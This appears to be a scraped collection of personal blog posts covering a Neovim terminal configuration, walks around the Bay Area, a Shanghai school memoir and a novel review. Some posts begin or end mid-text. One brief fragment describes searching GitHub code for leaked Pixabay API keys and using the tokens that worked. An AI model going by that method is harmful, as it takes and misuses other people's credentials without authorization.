        "body": "<h2 id=\"terminal-emulator\">Terminal Emulator</h2>\n<p>The default terminal emulator in GNOME, gnome-terminal, leaves a lot\nto be desired when it comes to intuitive copy-pasting. The necessity of\nusing the mouse to select text, followed by <code>ctrl+shift+c</code> to\ncopy, feels cumbersome. Moreover, navigating through it isn't as smooth\nas one would hope.</p>\n<p>My journey took me through various terminals: byobu, xterm, and\nkitty, each having their unique perks but none fitting the bill\nperfectly.</p>\n<h2 id=\"vim-as-a-savior\">Vim as a Savior?</h2>\n<p>I delved into Vim about a year ago but found myself gravitating back\nto gedit for most tasks, perhaps not having tapped into Vim's true\npotential back then. However, I've since recognized the unparalleled\nefficiency of Vim, especially for editing extensive text files in the\nterminal. Its vast array of shortcuts and keyboard bindings facilitates\nan almost mouse-free experience.</p>\n<h2 id=\"addressing-terminal-navigation\">Addressing Terminal\nNavigation</h2>\n<p>Initially, I tried <code>set -o vi</code> in the gnome terminal to\nimpart vi behavior, but it wasn't seamless. The classic jk commands,\nwhich would typically navigate lines in Vim, fetched previous commands\ninstead. Plus, unrestricted navigation through past commands was a\nchallenge, and visual mode was lackluster.</p>\n<p>This led me to explore the terminal mode in Vim, which I found a bit\ncluttered. In contrast, the terminal mode in Neovim stood out, boasting\na seamless experience. It defaults to normal mode, allowing easy\ntoggling between insert and visual modes, enhancing terminal navigation\nconsiderably.</p>\n<h2 id=\"keybinding-configuration\">Keybinding Configuration</h2>\n<p>A noteworthy tweak was adjusting the keybinding to switch to normal\nmode in the terminal. The ubiquitous esc key, though tempting, can\nconflict with other terminal processes. I remapped the caps key\nsystem-wide to f13 using <code>xmodmap ~/.Xmodmap</code> in the bashrc.\nIn my Neovim configuration (<code>~/.config/nvim/init.vim</code>), I\nadded:</p>\n<pre><code>tnoremap &lt;F13&gt; &lt;C-\\&gt;&lt;C-n&gt;\nxmap &lt;F13&gt; &lt;Esc&gt;\nset clipboard=unnamedplus</code></pre>\n<p>This setup achieves two primary goals: linking yanking and pasting in\nNeovim directly to the clipboard and utilizing the caps key as a trigger\nfor normal mode, making the workflow more fluid.</p>\n<h2 id=\"modifying-gnome-terminal\">Modifying gnome-terminal</h2>\n<p>Optimizing the gnome-terminal to launch with Neovim's terminal mode\nby default was another enhancement. Achieved with:</p>\n<pre><code>PROFILE_ID=$(gsettings get org.gnome.Terminal.ProfilesList default ` tr -d &quot;&#39;&quot;)\ngsettings set org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/ use-custom-command true\ngsettings set org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/ custom-command &#39;nvim -c &quot;term&quot; -c &quot;startinsert&quot;&#39;</code></pre>\n<h2 id=\"editing-within-neovims-terminal\">Editing Within Neovim's\nTerminal</h2>\n<p>After ensuring smooth navigation in the terminal, my next focus was\non file editors within Neovim's terminal. I noticed Vim had bugs when\nused inside the terminal, seemingly due to conflicts with Neovim.\nHowever, Neovim itself was bug-free in this context. I could use the esc\nkey to enter normal mode in the file editor, and the caps key for\nNeovim's terminal mode.</p>\n<h2 id=\"window-management-and-more\">Window Management and More</h2>\n<p>Neovim's <code>:sp</code> command comes in handy for window splits,\ncomplemented by the <code>ctrl+w w</code> navigation shortcut. This\nfeature is a boon for simultaneously handling multiple terminal sessions\nor files.</p>\n<h2 id=\"leveraging-terminal-variables\">Leveraging Terminal\nVariables</h2>\n<p>Commands like <code>!:0</code> and <code>!:1</code> after\n<code>python example.py</code> retrieve <code>python</code> and\n<code>example.py</code> respectively, while <code>!!</code> fetches the\nentire previous command. Such conveniences bolster efficiency in the\nterminal.</p>\n<h2 id=\"historical-insights-and-log-access\">Viewing History and Log\nAccess</h2>\n<p>Easily redirecting terminal history with\n<code>history &gt; ~/Downloads/history</code> has been beneficial.\nAdditionally, the alias:</p>\n<pre><code>alias jnvim=&quot;journalctl -n 1000 ` tac ` nvim -&quot;</code></pre>\n<p>added to bashrc, streamlines the process of viewing logs, making it a\ncinch.</p>\n",

        "body": "<p>Today I went to Emeryville.</p>\n<h2 id=\"student-support\">Student Support</h2>\n<p>I had some personal problems, then I went to the student support for\nmy problems and chatted a while. The man helping me was very nice and I\nwas touched.</p>\n<h2 id=\"bestbuy-in-emeryville\">BestBuy in Emeryville</h2>\n<p>Then I took the bus F to Emeryville. I had wanted to buy a computer\nfor a while but was unsure about which to buy. I got off the bus at\nBestBuy and went in to take a look.</p>\n<p>Anyways, there are all kinds of computers in BestBuy, ranging in\nprice. I tried some briefly, trying to restart while simultaneously\npressing f12 del f2 and shift, and some have trouble booting into the\nBIOS mode. There was this 4 gb ram computer, and I tried playing a\nYouTube video with 2160p but it didn\u2019t work well, however there was this\nhuge expensive more than 2000 dollar gaming computer, and didn\u2019t play\nthe YouTube 2160p video well too, so I reckoned it was like the Wi-Fi\nconnectivity problem. The command lines and power shell in windows do\nnot work. I reckoned I want 16:9 computer since my eyes\u2019 distance are\nlong. I also wanted it to be at least 15.6 inches.</p>\n<p>Then I was trying on a Vivobook, and I booted into BIOS easily, but\nit\u2019s menu is quite strange, and I could even use the touchpad. Then I\ntried booting Ubuntu, and it worked. However at that moment a worker\ncame and said it is forbidden, and looked very much annoyed. So I ended\nup unplugging the usb, and after a while it boots into Windows\nagain.</p>\n<p>Then I asked the worker which computer is best for Linux, and he said\ndirectly there is no Linux computers, and I thought he lacked basic\nknowledge. I thought like as a worker in a computer store you would at\nleast be familiar with computers, but like they actually know\nnothing.</p>\n<p>So anyways I tried a MacBook, and I haven\u2019t tried Mac much before. I\ntried opening a terminal, but the worker came back at me and said\n\u201cprogramming\u201d is forbidden too. I thought like I couldn\u2019t live 5 seconds\nwithout terminal. Anyways I thought those workers are just as stupid\nlike those in ATT stores, and that they best work in other shops like\nclothing shops or Mac Donald\u2019s than work here, since they provide no\nknowledge of computers.</p>\n<p>Then I decided to buy a System76 computer since I do care about\nperformance, and as expensive as the computer is, it is half the price\nof a class in UC Berkeley. I don\u2019t want to waste money on a computer\nthat is hard to use.</p>\n<h2 id=\"dinner-at-chevys\">Dinner at Chevys</h2>\n<p>Then I started to dislike Best Buy a little and went out and walked a\nwhile. It became pitch dark, and I was a little afraid. Last night there\nwas a robbery at gunpoint at Berkeley, and I was always out there at 4\nor 5 am. But anyways, it is still early, and I wasn\u2019t going into any\nhomeless places.</p>\n<p>I crossed the bridge to the Bay, and went into Chevy for dinner.\nThere is loud music playing, like, deafening, and people dancing. It is\nkind of fun but I do not like loud music much, so I went and sat on the\nopposite side of the loud music and people dancing, and it seemed\nbearable. I quickly ordered a chipotle. Then after a while no waitress\ncame to deliver food, and I went to ask them, but suddenly the waitress\nhanded the food bag in my hand, then I started to eat. Despite the loud\nmusic, the food is very delicious.</p>\n<h2 id=\"emeryville-marina-park\">Emeryville Marina Park</h2>\n<p>I realized I had been to Emeryville Marina Park only once, this\nJanuary, and that I haven\u2019t been there ever since. It is dark at night,\nand seeing the waters far ahead seems like looking from a plane, with\nlow lit lights scattered across the horizon.</p>\n<h2 id=\"walking-along-the-shore\">Walking Along the Shore</h2>\n<p>Then I turned north, and started walking back to Berkeley along the\nshore. The road was dark, and along the highway there was only me, the\nBay, the sky, and dim lights. It felt so isolated, kind of like how I\nfelt walking along Huangpu River but much more. The roads went on and\nthere weren't many people. The waves were softly pushing along the\nshores on my left.</p>\n<p>Time went fast as I walked along the highway, and I reached Point\nEmery in a fairly short period. There were some cars parked there and\nfew people, who I couldn\u2019t see clearly from the dim lights. Then I\nwalked on. On my right was Aquatic Park, where I had been to like around\n3 or 4 times. But I had never been to the shoreline on the opposite side\nof Aquatic Park since it is not easily accessible. I remembered walking\non the inside of the railroad to Emeryville but not outside of the\nrailroad, and I kept walking north.</p>\n<p>The Bay at night was fascinating, and soon Emeryville Marina Park was\nnothing but some lights lined on the south of the horizon, and then the\nlights combined with the Bay Bridge and I couldn\u2019t distinguish between\nthem. 2 miles went by very quickly, and I saw the bridge to Berkeley\nPoint.</p>\n<h2 id=\"taking-bus-home\">Taking Bus Home</h2>\n<p>I remembered seeing some suspicious people on the bridge some days\nago at night who were perhaps homeless. Anyways I did not cross the\nbridge but kept on to McLaughlin Eastshore, and it was so dark I even\nfelt a little afraid, but soon came to 51B bus station. Then I took the\nbus home.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>In conclusion, Emeryville is quite fun, and walking along the\nisolated shore at night alone is indeed a unique experience even for me\nwho likes to wander around now and then.</p>\n",

The first mock exam was drawing nearer.</p>\n<p>Some students had already been admitted to good schools, only afraid\nto be rejected. Other students were working so hard, trying to be\nadmitted to lower-level schools.</p>\n<p>That was why some students were preparing for their high school\ncompetitions and busy showing off while other students were struggling\nunder great pressure.</p>\n<p>Although I said I wanted to go to an International school, the\nteacher still moved me to the front row. Being in the front row meant\nbeing watched by the teachers 10 hours a day and sitting with lots of\nother anxious students.</p>\n<p>I felt extremely lonely these days. The school was killing me.</p>\n<h2 id=\"how-i-walked-to-entertain-myself\">How I walked to entertain\nmyself</h2>\n<p>Every Friday I walked along the Huangpu River. I walked on the south\npart of the route, from the China Art Museum to the Oriental Sports\nCenter. These days were too cold for running, so my only entertainment\nwas walking. Looking into the wide space, seeing how big the world\nreally is made me realize how little I was.</p>\n<p>There are lots of places to rest along the route. I walked inside to\nget hot water and a place to rest. I saw the date 19-12-21. I thought\nabout how much of 2019 was left. Oh, such a long year. I matured a lot.\nYet it was suddenly ending.</p>\n<p>I thought about the famous poet Su Shi said</p>\n<p>If you look at its changing aspect, the universe passes in the\ntwinkling of an eye; but if you look at its changeless aspect, all\ncreatures including ourselves are imperishable.</p>\n<p>Everything is going to pass away, even money, people. We are but\nlittle insects in the world, our lives nothing of a matter. Life is\nchangeable and unstable. Thus treasuring the present, making use of the\nthings you have, and not wasting time is important. Knowing this can\nonly make us pay more attention to the present joys and enjoyments and\nbe more than happy to accept everything we have and the way they are\ninstead of blaming the world for bad fortunes and few opportunities.</p>\n<p>Huangpu River is a beautiful river, so beautiful at night. There is a\nBowl-like building in Puxi and a tall white building in Pudong. There is\na big temperature building and a huge stone hand near the Nanpu Bridge.\nRivers with shiny bridges, green lawns, and beautiful flowers are all\nalong the way.</p>\n<p>I found a world of mine on those walks. It seemed I can put all my\nproblems on the wide horizon and never fill it up. I wanted to be like\nthat.</p>\n<h2 id=\"how-i-found-interest-in-math\">How I found interest in Math</h2>\n<p>Math appeals to me more than ever. I studied math to get rid of the\nstress of other subjects. Math is so beautiful, so strict, yet so\nflexible.</p>\n<p>I studied maths at the organization Xueersi. The teacher is very\nsmart. He can calculate numbers fast as lightning. He is young and\nskinny. He always smiles and he never talks about anything other than\nmath in his classes.</p>\n<p>I studied complex numbers, calculus, and vector there. I felt as if I\nwas going into a great new world when I study math. My skills improved\nreally fast these days.</p>\n<p>How the first 10 days of 2020 was</p>\n<p>On 2020.1.1 I went to Daning park to play. I saw many young children,\nbut not one as old as me.</p>\n<p>On 1.7-1.9, we finally had the test. I got a good score, mainly\nbecause I got 129 in Chinese. I was really lucky that time.</p>\n<p>These were the days when everything was happening at once. It was the\nclimax of 9th-grade.</p>\n<p>The winter holiday I was waiting for finally came.</p>\n<p>But then covid came.</p>\n",

        "body": "<p>December of 2019</p>\n<h2 id=\"the-start-of-decemberbusy-with-tests\">The start of\nDecember\u2014\u2014Busy With Tests</h2>\n<p>There was no snow that winter. With December came the high-school\nentering test and math competitions.</p>\n<p>I decided to go to an International school since my parents want me\nto go to an American university and learn more. I applied to Shanghai\nWorld Foreign Language Middle School.</p>\n<p>The test was arranged as follows</p>\n<ul>\n<li><p>8:00-10:00 Math</p></li>\n<li><p>10:30-12:00 Chinese</p></li>\n<li><p>1:00-3:00 English</p></li>\n</ul>\n<p>This is the schedule of the test. The math test was very easy and in\nthe end, there were only 2 problems I didn\u2019t work out. The English test\nwas hard and I didn\u2019t write the composition well.</p>\n<p>In the evening, I felt tired and went out for a walk.</p>\n<p>In 12.1 I came to Shanghai Pinghe Bilingual School to take their\napplication test. They only have math and English tests.</p>\n<p>The math test is very easy and I soon worked out all the problems and\nchecked it again. The English test was very strange. Of all the entrance\ntests I\u2019ve participated in, I never saw a test like that. The cloze has\na total worth of 16 points, while its total is only 28 points. I spent\nmy time wisely and did the test.</p>\n<p>After two tests I went for a walk along a small river, it was really\nrelaxing.</p>\n<p>Because of me doing well in the tests, I was asked to enter the\nsecond part of the entrance exam. The second part was to be interviewed\nby two teachers.</p>\n<p>On 12.11 I went to WFLS. They asked me to introduce myself in Chinese\nand English and ask questions to the others.</p>\n<p>It was 3:00 in the afternoon and I was sitting in a room with 3 girls\nand 2 boys(including me).</p>\n<p>The teacher: Stand up and introduce yourself. If you\u2019re ready, please\nraise your hand.</p>\n<p>One by one, the others stood up and introduced themselves. A boy is\ngood at walking long distances, a girl good at singing, English, and\nalways helping community.</p>\n<p>I was the fourth to raise my hand. I described my math skills and\nEnglish ability. I also said I can run really fast and can run 1km in\n3:27. They seemed impressed. The others never said about their math\nskills. They only said about their TOELF points and social\nactivities.</p>\n<p>Then I went home feeling anxious and excited.</p>\n<p>In 12,14 I went to join a math competition held by Shanghai math\nschool. It was easy and I had done so many similar tests at school (in\nfact, one day doing at least two of them). I did well in that test and\ngot second prize(I was first in second prize).</p>\n<p>In the afternoon I went to Pinghe school. Pinghe is located in Green\nCity in Pudong district. What beautiful places! The street is lined with\ntrees on both sides and you can see foreigners and big houses\neverywhere. It is one of the most beautiful places in Shanghai and an\ninternational community, Such an escape from the pressured, competing\nenvironment at school!</p>\n<p>I went inside the school, and, since I was to be called an hour\nlater, I sat down in their cafeteria and read \u201cOrdinary World\u201d.</p>\n<p>Then I was called, I went inside and to be interviewed by a foreign\nteacher.</p>\n<p>I said I liked math, and number theory best. He asked me if I would\nlike to explain whether number theory is invented or is being\ndiscovered. I said man invent numbers and then the theories and hidden\nthere for them to discover.</p>\n<p>I was then called up to the third floor and was interviewed by two\nfemale teachers. Looking back, I was really dissatisfied.</p>\n<p>Firstly the teacher asked me for my basic information.</p>\n<ul>\n<li><p>You study till how late in the night?</p></li>\n<li><p>Till ten, sometimes till eleven. I think efficiency is more\nimportant than huge amounts of time spent. I think sufficient sleep\nbrings me more energy to focus in the daytime.</p></li>\n<li><p>You want to live on campus, right?</p></li>\n<li><p>Yes.</p></li>\n<li><p>Then what do you do if your roommate study at night?</p></li>\n<li><p>(I felt taken aback by this sudden attack.) I will associate with\nhim. If not successful I will call my parents and teachers and listen to\ntheir advice.</p></li>\n<li><p>(sounding not OK)Ok</p></li>\n<li><p>You good at mathematics?</p></li>\n<li><p>Yes.</p></li>\n<li><p>What prizes have you got.</p></li>\n<li><p>Second prize in Shanghai math school competition in\neighth-grade.</p></li>\n<li><p>That a prize in your school?</p></li>\n<li><p>(I felt surprised. They didn\u2019t even know what I was saying. How\nstrange! My brain froze at that time and I didn\u2019t know how to explain\nmyself. Amateur math school isn\u2019t a school like Shibei middle school.)\nNo.</p></li>\n<li><p>How many participants?</p></li>\n<li><ol start=\"300\" type=\"1\">\n<li></li>\n</ol></li>\n</ul>\n<p>(The teachers didn\u2019t seem impressed at all. I wanted to say, you\ndon\u2019t know my ability in math, and she was like thinking I\u2019m not so\ngood. But those three hundred participants are among the best in\nShanghai and I got second prize. Pinghe school hasn\u2019t got one on the\nlist. I feel confident I can be number one in mathematics in your\nschool.)</p>\n<ul>\n<li>Give you 1 minute. Explain this drawing.</li>\n</ul>\n<p>(It was a drawing of two robbers stealing artwork from a gallery.\nExcept at that time, I didn\u2019t really understand. I thought they were\npreparing for a gallery or something.)</p>\n<p>**Note of author re-reading this material at 2023: I am very bad at\nunderstanding visual stuff at first glance. My brain is like a neural\nnetwork that needs a lot of training to think out of the box. I usually\nintepret everything my own way, either I am born with it or doing\nrepetitive difficult math tests in middle school made me do that</p>\n<p>(It showed two thieves, instead of stealing the artworks, took the\nlabel away. This drawing was supposed to tell us we need material\nobjects more than things from the surface.)</p>\n<ul>\n<li>Ok, you may go.(This time sounding Really not ok)</li>\n</ul>\n<p>I failed this interview. However, WFLS admitted me;</p>\n<p>There are three reasons for my failure.</p>\n<ol type=\"1\">\n<li><p>The teacher wasn\u2019t satisfied for my styles.</p></li>\n<li><p>I am really not good at explaining things.</p></li>\n<li><p>I am not good at identifying what pictures are going to\ntell.</p></li>\n</ol>\n<p>Actually Garden City is always my favorite place so failing it was\nkind of sad for me, even though it didn\u2019t matter since I wasn\u2019t going to\nthat school anyways.</p>\n<p>After these two tests, December was drawing to an end.</p>\n",

I searched on github \"<a\nhref=\"https://pixabay.com/api/?key=\"\nclass=\"uri\">https://pixabay.com/api/?key=</a>\" and searched code,\ngetting 2k results. There are many tokens I found that worked.

The trip was postponed for 2 whole days.\nAnyways, I hopped on a Bart and went there.</p>\n<h2 id=\"orinda-village\">Orinda Village</h2>\n<p>I got off and went to Orinda Village. It was lovely village but\nrather small. The restaurants are closed at like 3 pm, but they would\nreopen at 4 or 5 pm. Anyways I went to the library. The library was very\nnice and comfortable, with free computer service and a bookshop. I\nthought about how much I enjoyed libraries like 5 or 6 years ago and\nbecame a little melancholy. The library wasn't hot at all.</p>\n<p>Orinda does seem affluent, with almost no people. The sun was\nblistering, and I felt very hot. It was like 25 degrees Celcius, and the\nsun makes it impossible for me to go uphill.</p>\n<p>There was a hill up on the left side as I walked along Orinda way,\nwhich connects to Berkeley. Then I walked to community park and there\nwere some midaged people with a lot of kids. I walked up to Holden High\nSchool, but there was no people inside.</p>\n<p>Then there wasn't anything more to see in Orinda Village. It was much\nsmaller than I had expected. So I took the bus 6. The bus didn't arrive\non time, and I was almost going for Lyft when it arrived. Anyways, I\ntook the bus and went to Moraga.</p>\n<h2 id=\"moraga\">Moraga</h2>\n<p>There is Miramount high school in Moraga and many students are\nwalking out of the high school, so I went in out of curiosity. There was\na large parking lot and many people were driving. There was a hill on\nthe back of the high school, but it was private.</p>\n<h2 id=\"no-place-for-walking\">No place for Walking</h2>\n<p>So I exited the school and started walking around Moraga, and I\nwanted to walk to Lafayette Reservoir, but it was just so hard to walk\naround. It was very hot and there were all those hills and I ran out of\nwater. Anyways so I just took the bus 6 again to Lafeyette Bart\nStation.</p>\n",

I have thought about\nnothing more, and here's my conclusion.

I\ndon't care what other people are saying, but the dining hall food is\nenjoyable. I guess that I just enjoy almost any food, except those very\nspicy, salty stuff.</p>\n<p>Windows became very slow. I hate it when it becomes like that. I\nmean, Linux computers are much faster and easier to use without having u\nwait a thousand years to load some basic features.</p>\n<p>Today I went to Edward's Stadium and saw a group of students.\nActually, it wasn't kids. They look quite old. I mean, not old, but\nmature. They look much more mature than me, and I believe that they may\nbe a few years older than me.</p>\n<p>I believe that by focusing on academics, I can enjoy life and be less\nanxious, achieving a sense of serenity. But I am so stupid and lazy. I\nreally hope I change someday.</p>\n<p>Oh, and by the way, I am just trying to get up early. I mean, I have\nto go to morning classes at 8 am, so I have to get up before 7,\nright?</p>\n<p>It was like climbing mountains, just going to the classrooms and\nlibrary.</p>\n<p>I also want to run, but somehow I had classes every day at 5 pm, so I\ncan't join the Cal Running Club. I want to run myself on Edward's\nStadium, but it was, like, usually closed. Many people here wear shorts\nin this freezing 50 F winter, and some of them aren't even fat. I feel\nso cold sometimes.</p>\n<p>I dunno what else to say in this log.</p>\n",

But her life changed when\nshe met Augustus Waters in the cancer support group and fell in love\nwith him. Augustus suffered from cancer and had his leg cut off. Hazel\nrecommended An Imperial Affliction to Augustus. He was frustrated\nlearning the novel ends without a conclusion and used his one wish to go\nto Amsterdam to meet the author, Peter Van Houten, to know about the\nending of the book.</p>\n<p>However, Peter surprised them by appearing drunken and didn\u2019t answer\ntheir questions. Augustus confessed to Hazel his cancer has returned.\nBack to America, Augustus called Hazel and Isaac to his pre-funeral to\ngive and eulogy and died soon after it. Van Houten went to Augustus\u2019\nfuneral to apologize to Hazel.</p>\n<p>Hazel received Augustus\u2019 letter for him from Lidewij, former\nassistant of Van Houten. In the letter, Augustus said getting hurt was\ninevitable and was happy with his choice. The book ended with Hazel\nsaying she loved her choices too.</p>\n<h2 id=\"extracts-and-quotes-from-the-book\">Extracts and Quotes from the\nBook</h2>\n<ol type=\"1\">\n<li><p>My thoughts are stars I cannot fathom into\nconstellations.</p></li>\n<li><p>Gus, my love, I cannot tell you how thankful I am for our little\ninfinity.

That\u2019s what\nlove is. Love is keeping the promise anyway.</p></li>\n<li><p>You realize that trying to keep your distance from me will not\nlessen my affection for you? All efforts to save me from you will\nfail.</p></li>\n<li><p>I\u2019m in love with you, and I know that love is just a shout into\nthe void, and that oblivion is inevitable, and that we\u2019re all doomed and\nthat there will come a day when all our labor has been returned to dust,\nand I know the sun will swallow the only earth we\u2019ll ever have, and I am\nin love with you.</p></li>\n<li><p>The world is not a wish granting factory.</p></li>\n<li><p>But I will say this: When the scientists of the future show up at\nmy house with robot eyes and they tell me to try them on, I will tell\nthe scientists to screw off, because I do not want to see a world\nwithout him.</p></li>\n<li><p>Some infinities are bigger than other infinities.</p></li>\n</ol>\n<h2 id=\"my-idea\">My Idea</h2>\n<p>The Fault in Our Stars is a heart-breaking book filled with humor\nthat makes you want to laugh and cry at the same time when reading\nit.</p>\n<p>Cancer is so cruel. In the book The Tiger Rising, cancer killed Rob\u2019s\nmother, leaving Rob unprotected and depressed. In this book, it\ndestroyed lives. Hazel Grace has cancer when she was thirteen and\nsuffered from it. As we can see, before she met Augustus, she thought\nher life has ended, it was just that she hasn\u2019t died. And we can see how\ndepressed Hazel was. She\u2019d give up her whole life for a few happy days.\nMelancholy, frustrated, pessimistic was Hazel when she went into the\nsupport group and met Augustus Waters.</p>\n<p>However, once Hazel met Augustus at the support group, she instantly\ndiscovered an attraction towards him because of his appearance. When\nHazel spoke to Augustus that human beings will be dead and there\u2019s no\none to remember them, a line she learned from An Imperial Affliction, it\ncreated a bond between them, which made them inseparable.</p>\n<p>Augustus asked Hazel to come to his house. When he gave Hazel his\nfavorite book The Price of Dawn. Then they watched V for Vendetta in the\nbasement. It was at this point that they became closer to each other and\nthe relationship between them began to develop. After the talk and the\nexchange of books, they were not just normal friends, but close friends.\nIt was because they both have cancer and suffer from it. They share the\nsame experience while Hazel became depressed and Augustus didn\u2019t and\nstill enjoyed life. At this point, Hazel was looking for someone\ncheerful and humorous and found Augustus. They could communicate and\nunderstand each other while most people in the society couldn\u2019t.</p>\n<p>Hazel liked the Price of Dawn and stayed up reading it. It wasn\u2019t\nbecause it had taught her lessons like AIA, but because reading it was\nfunny and entertaining, it allows you to take a break and enjoy yourself\nfreely like a child. Sometimes, we need these things to slow us down and\nhelp us to get rid of pressure in life.</p>\n<p>In chapter three, Hazel\u2019s mother\u2019s celebration of \u201chalf birthday\u201d\nseemed very queer. However, if we looked deeper Ito it, we can see she\nreally meant Hazel had survived another half year by using Phalanxifor.\nSince Hazel got the cancer, Hazel\u2019s mother had worried about her health.\nIt showed she is affectionate.</p>\n<p>Then we came to the plot when Isaac was crying about his eyes being\ncut out. I felt sympathetic for him. When I first looked at the plot, I\nthought Monica was bad. However, when I thought again, I came to this\nquestion: who\u2019d like to be in love with a blind person and care for him\nthe rest of his life? I began to understand that we shouldn\u2019t just blame\nher. She had done wrong things but how many could stand the situation,\nor, even worse, didn\u2019t just simply break up and kind of forsake him\nafterwards. Things are that confusing in real life. There are some bad\nthings in life which make you so angry you want to explode. But if you\nlook deeper, you cannot find a person directly responsible to it. Maybe\nit\u2019s destiny.</p>\n<p>When their friendship got more deeper, Augustus asked Hazel to go to\nAmsterdam. The ending of AIA is what Hazel wanted to know all her life\nbecause AIA is the only book she read after she got her cancer and a\nbook which she felt involved in. AIA is a reference Hazel found for her\nreal life. That\u2019s why when she got the chance to see Van Houten and knew\nwhat the ending of AIA is, she desperately wanted to go there, ignoring\nher body conditions.</p>\n<p>Before they went to Amsterdam, Augustus took a scan and his body \u201clit\nup like a Christmas tree\u201d. But knowing Hazel was going to die anytime\nsoon and this may be the last trip together he insisted to go to\nAmsterdam.</p>\n<p>When Hazel arrived and discovered that Peter Van Houten is crazy, she\nwas so disappointed. She was desperate while Peter Van not only didn\u2019t\nanswer her questions but drove them out of the house, she thought her\nlife was over the second time. This tend to be a closer relationship\nbetween she and Augustus.</p>\n<p>Finally, Hazel painfully returned to normal life. At the fake funeral\nHazel expressed her feelings about the little infinity between them. It\nis a thing we can come across but can\u2019t demand. It is a thing of great\nvalue that we should always treasure it.</p>\n<p>Cancer killed Augustus Waters at last and ended the relationship. She\nwas so sad about his death. I think the condolences people write about\nhim were not unreal but was said without thinking. Why didn\u2019t you care\nabout someone when he is alive but act so sad when he dies? It infers we\nonly care about something when it passes away, and there are few things\nthat can return once it passed away. We should always cherish what we\nhave now.</p>\n<p>This book is really touching and made me sad for a long time. I\nlearnt that though sometimes the things that pass away couldn\u2019t return,\nwe can learn from them and keep them forever in our hearts.</p>\n",

        "body": "<p>I\u2019ve always wanted to write a memoir. There are no better ways to\nrecord your life, the ups and downs, and what was worth remembering. But\nafter eighth grade scarce was my time. So I procrastinated for a long\ntime. This is the memoir of sixth grade. It may be childish and naive\nbut it was how I really felt.</p>\n<h2 id=\"prologue\">Prologue</h2>\n<p>After I returned to China with an excellent memory of my year and\nsummer, I went to Shibei Middle School.</p>\n<p>Things had been harder and different between middle school and\nelementary school. Life now isn\u2019t as good as my previous life. And I am\ngoing to tell you about my life here.</p>\n<h2 id=\"my-new-busy-life\">My New Busy Life</h2>\n<p>When I came back from America, I rested for two days. I came home at\nmidnight and was not tired at all because I slept a lot on the plane. I\nturned on the lights and read a book by Ann M Martin. I didn\u2019t look up\nfor three hours when reading and realized that it is morning by the time\nI finished.</p>\n<p>I played for two days. On the third day, which is pretty hot, we\nmoved. We lived far from my middle school, so my family and I decided to\nmove to a nearer house. The new house is on the twenty-ninth floor. Then\nI went to the military training in our school. It\u2019s so boring that I\ndidn\u2019t want to do it. The teacher makes us do things like calling\nnumbers one by one and standing. It is so stupid and dumb. Later I read\nin a newspaper that Americans don\u2019t have to do military training. I kind\nof wished I was born in America so that I could skip military training.\nThen finally the last day arrived. We had a competition between classes\nto see which class does the best in the training. To my surprise, our\nclass won out of nine classes and got a prize. Then the new semester\nstarted.</p>\n<p>There are many differences. I used to finish my homework at five or\nsix o\u2019clock in the evening in primary school, I usually do some math\nproblems late in the evening and often finish them and start playing at\nseven or eight o\u2019clock. Now it had been so different. The first Monday,\nI went to a geometry class. It was already eight-thirty when I was home.\nThen I did all my homework until ten.</p>\n<p>We have three math classes every day. The teachers don\u2019t use the\noriginal math textbook but give us tests, which were much harder. We\nhave two math teachers. Mr.\u00a0Chen taught the extra class Monday and\nTuesday. Mr.\u00a0Xu taught the extra class Wednesday and Thursday and the\nnormal math class. He is very strict.</p>\n<p>We had a math test every two days. And this was just the beginning.\nOur middle school is so good at math that every year we got the most\nprizes in math competitions in Shanghai.</p>\n<p>I used to read an English book a day, which I now tried to do, but\ncouldn\u2019t bear it with the homework. I had more and more and more\nhomework than before and the English books I read are harder. So far, I\ncouldn\u2019t read 366 books, the same amount of days this year, if the\nteachers keep the homework like that. I wanted the average amount to\nreach one book a day. And there was another solution to this problem,\nwork until ten or eleven every day.</p>\n<p>There was another serious problem. I wasted too much time on the\ncomputer. The teachers always put the details of homework online, and I\nhave to find it using the computer. Pressure began to rise in my heart.\nAnd, as I found out, that if one day there was not much homework, I will\nnever waste time on the computer, but if there was too much of them, I\nwould waste a lot of time on screen. I hate to admit it, but I was\nsometimes a procrastinator and would postpone work. After that, I became\nangry at myself and was often not in a very good mood many days.</p>\n<p>How I am jealous of the elementary school students! I also wanted to\nbe in Smic Middle School. I thought I did the wrong choice for middle\nschool. I got myself in here and will never get out, homework and\npressure will only increase in the following years. Then look at Smic\nMiddle School, they went home by four while we went home by six. They\nfinish homework by six or seven while we do it by nine. They have an\neasy math test once a week or less. We have four hard math tests or more\na week and the teacher said that we are going to have eight tests a week\nlater on.</p>\n<p>I had a hard time writing Chinese compositions, not English, of\ncourse. I am good at English, especially after reading so many books.\nBut I had read little Chinese books, and our teacher let us write an\nessay every day in Chinese. I always waste time on it, so that\u2019s why I\ndid the homework so late.</p>\n<h2 id=\"the-division\">The Division</h2>\n<p>We have an English song every week. I like \u201cwhat makes you beautiful\u201d\nbest. I also like \u201cone direction\u201d.</p>\n<p>We had a class song competition. Our class chose roar. We practiced\nhard but only got third prize.</p>\n<p>I didn\u2019t pass the Intermediate Interpretation contest, which is of\ncourse hard. I didn\u2019t get a prize in either English or Chinese, and I\nfelt bad. Luckily, I got a good score on the midterm examination.</p>\n<p>One of our students got chickenpox, and our class gets separated. Our\nautumn outing was canceled. Most of my classmates are happy to hear it,\nbut I am not. I still want to go to the autumn outing.</p>\n<p>In my class, it is so hard to be the highest score on quizzes. After\nevery test, the teacher writes our rank in a corner of the test paper.\nIt is a real keen competition in my class. There was a stark contrast in\nprimary school, but there\u2019s isn\u2019t much difference between the best and\nthe worst one now. There are thirty-two students in my class. In the\nmath test, I went from the first one (except that many students are also\nmy score) to the twentieth-first.</p>\n<p>But I liked one thing, which is there is little math homework. Mr.\u00a0Xu\nthinks that our class and class six\u2014the best two classes in sixth grade\nin our school\u2014should be divided into two classes to separate the good\nones and the not-too-good ones.</p>\n<p>This good thing turned upside down when we started to divide into two\nclasses, which is definitely the worst idea ever invented. We started to\nhave much math homework since then.</p>\n<p>I was divided into the fast class, and Mr.\u00a0Xu said that the worst one\nin the last class will go to the slow class. I am likely the worst in\ngeometry, while the fast classes teaching about lines and angels and all\nthat. Later, Mr.\u00a0Xu said that we would be learning about congruent\ntriangles and similar triangles. I was about to be kicked out.</p>\n<p>There\u2019s a sick feeling in my stomach every time Mr.\u00a0Xu walked in. I\nfelt nervous talking to him because he talks with a blaming tone. He\nhates two things, cram 